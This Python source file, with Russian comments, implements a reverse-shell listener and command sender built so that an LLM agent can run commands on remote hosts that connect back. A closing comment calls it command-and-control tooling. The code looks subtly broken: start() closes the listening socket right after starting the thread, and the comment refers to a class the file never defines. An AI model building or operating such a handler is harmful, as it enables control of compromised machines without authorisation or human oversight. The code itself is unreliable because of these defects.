"""
Утилита управления командами для работы LLM-клиента.

Этот модуль предоставляет реализацию клиент обратной оболочки, которая позволяет LLM
управлять и взаимодействовать с удалёнными оболочками.
Он обрабатывает запуск/остановку слушателей,
отправку команд и управление сессиями оболочек.
"""

import socket
import sys
import threading


class ReverseShellClient:
    """
    Клиент обратной оболочки, работающий в фоновом режиме и позволяющий LLM:
    - Запускать/останавливать слушатели
    - Отправлять команды подключённым оболочкам
    - Получать доступ к истории команд и выводу
    - Управлять несколькими сессиями оболочек

    Оболочки работают в фоновом режиме (втором плане), позволяя LLM:
    - Сравнивать и анализировать выводы команд
    - Цеплять команды через сессии
    - Мониторить статус оболочек
    """

    def __init__(self, host="127.0.0.1", port=4444):
        """
        Инициализация клиента обратной оболочки
        Args:
            host: IP-адрес слушателя, по умолчанию все интерфейсы
            port: Номер порта слушателя, по умолчанию 4444
        """
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = False
        self.listener_thread = None
        self.command_history = []
        self.client_socket = None

    def handle_client(self, client_socket):
        """
        Обработка входящего подключения клиента в фоновом потоке
        Args:
            client_socket: Подключённый сокет клиента
        """
        self.client_socket = client_socket
        client_socket.settimeout(30.0)
        while True:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                decoded_data = data.decode()
                self.command_history.append(decoded_data)
                sys.stdout.write(decoded_data)
                sys.stdout.flush()
            except socket.timeout:
                continue
            except (OSError, UnicodeDecodeError):
                break
        client_socket.close()
        self.client_socket = None

    def start_listener(self):
        """Запуск потока слушателя в фоновом режиме"""
        self.running = True
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            self.socket.settimeout(30.0)
            while self.running:
                try:
                    client_socket, _ = self.socket.accept()
                except socket.timeout:
                    continue
                client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_handler.daemon = True
                client_handler.start()
        except OSError as e:
            print(f"Ошибка в слушателе: {str(e)}")
        finally:
            if not self.running:
                self.socket.close()

    def start(self):
        """
        Запуск слушателя обратной оболочки в фоновом потоке
        Returns:
            str: Статусное сообщение с данными подключения
        """
        self.listener_thread = threading.Thread(target=self.start_listener)
        self.listener_thread.daemon = True
        self.listener_thread.start()
        self.socket.close()
        return f"Слушатель запущен на {self.host}:{self.port}"

    def stop(self):
        """
        Остановка слушателя обратной оболочки
        Returns:
            dict: Статусное сообщение
            dict: Статус с хостом и портом
        """
        self.running = False
        if self.client_socket:
            self.client_socket.close()
        self.socket.close()
        return {"status": "Слушатель остановлен"}

    def send_command(self, command: str):
        """
        Отправка команды подключённой обратной оболочке
        Команда выполняется в фоновом режиме, а вывод можно получить из истории
        Args:
            command: Команда для выполнения на целевом хосте
        Returns:
            dict: Статус выполнения команды
        """
        if not self.client_socket:
            return {"status": "error", "message": "Нет подключённого клиента"}
        try:
            self.client_socket.send(f"{command}\n".encode())
            return {"status": "success", "message": "Команда отправлена"}
        except OSError as e:
            return {"status": "error", "message": str(e)}

    def show_session(self):
        """
        Показать статус текущей сессии
        Returns:
            dict: Статус сессии с хостом и портом
        """
        return {"host": self.host, "port": self.port}

    def get_history(self):
        """
        Получить историю команд и вывод для анализа LLM
        Returns:
            dict: История команд и выводов, статус подключения
        """
        connected = "Подключён" if self.client_socket else "Не подключён"
        return {
            "history": self.command_history,
            "host": self.host,
            "port": self.port,
            "status": connected,
        }


# NOTE: C2 tools are instance methods on SimpleC2Server (stateful).
# They cannot be registered as standalone functions in TOOL_REGISTRY.
# Registration must happen at instantiation time by the agent that uses them.
